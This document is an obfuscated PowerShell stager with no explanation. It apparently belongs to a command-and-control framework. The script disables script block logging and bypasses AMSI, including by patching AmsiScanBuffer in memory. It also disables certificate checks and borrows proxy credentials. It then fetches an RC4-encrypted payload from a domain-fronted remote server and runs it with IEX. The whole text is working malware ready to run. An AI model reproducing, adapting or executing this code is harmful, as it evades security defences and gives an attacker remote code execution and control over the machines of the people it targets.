If($PSVERSiONTAble.PSVeRSIon.MAJOr -GE 3){$f0c32=[ReF].ASsEMbLy.GetTypE('System.Management.Automation.Utils')."GetFiE`LD"('cachedGroupPolicySettings','N'+'onPublic,Static');If($f0c32){$Ea761=$F0c32.GeTValuE($NulL);IF($ea761['ScriptB'+'lockLogging']){$EA761['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$ea761['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}$VAL=[CoLLectioNs.GENERIc.DiCtIonaRY[StriNg,SYsteM.OBJECt]]::new();$val.AdD('EnableScriptB'+'lockLogging',0);$vAL.ADD('EnableScriptBlockInvocationLogging',0);$EA761['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$val}ELse{[SCRiPTBlOck]."GetFie`lD"('signatures','N'+'onPublic,Static').SETVAlUE($NUll,(New-OBjEcT COLlEctIOnS.GenERiC.HaSHSET[STRinG]))}$ReF=[Ref].AssEMbly.GeTTYpe('System.Management.Automation.Amsi'+'Utils');$REf.GEtFieLD('amsiInitF'+'ailed','NonPublic,Static').SEtVAlUe($nUll,$TRUe);$MethodDefinition = "[DllImport(`"kernel32`")]public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);[DllImport(`"kernel32`")]public static extern IntPtr GetModuleHandle(string lpModuleName);[DllImport(`"kernel32`")]public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);";$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;$ABSD = 'AmsiS'+'canBuffer';$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);[UInt32]$Size = 0x5;[UInt32]$ProtectFlag = 0x40;[UInt32]$OldProtectFlag = 0;[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6) };[SYsTEM.NET.SERviCEPoIntManaGER]::Expect100CONtINUe=0;$b3904=New-ObjEct SySTem.NET.WEbCLIeNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0;rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$B3904.HeaDeRs.ADd('User-Agent',$u);$b3904.Proxy=[SysTeM.NeT.WEBReQuEST]::DEFaulTWebPROXY;$b3904.PRoxY.CREdENtiALs = [SySTEM.Net.CREdENTIALCAChe]::DeFaultNeTwoRkCRedENTials;$Script:Proxy = $b3904.Proxy;$K=[SySTem.TExT.ENCOdiNG]::ASCII.GeTByTEs('|G3=+ASlj?tEURm2*_fCN/h^<~:1I5Mz');$R={$D,$K=$ARGS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COUNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-BxoR$S[($S[$I]+$S[$H])%256]}};$ser=$([Text.ENCoDiNg]::UniCodE.GETStrInG([COnVErT]::FrOmBaSE64STRING('aAB0AHQAcABzADoALwAvAGEAagBhAHgALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtADoANAA0ADMA')));$t='/admin/get.php';TRY{$Ig=$B3904.DOwnloadDAtA($SEr)}CatCh{};$b3904.Headers.ADd("Host","mslabs.azureedge.net");$B3904.HEADERS.ADd("Cookie","mqLWGnORn=zRNEOd0yQWe6ZRHr6OUjTHaI03g=");$dAta=$b3904.DOWNLOAdDAtA($ser+$T);$iV=$dATA[0..3];$daTa=$DatA[4..$DaTA.length];-jOIN[CHAr[]](& $R $DAta ($IV+$K))|IEX
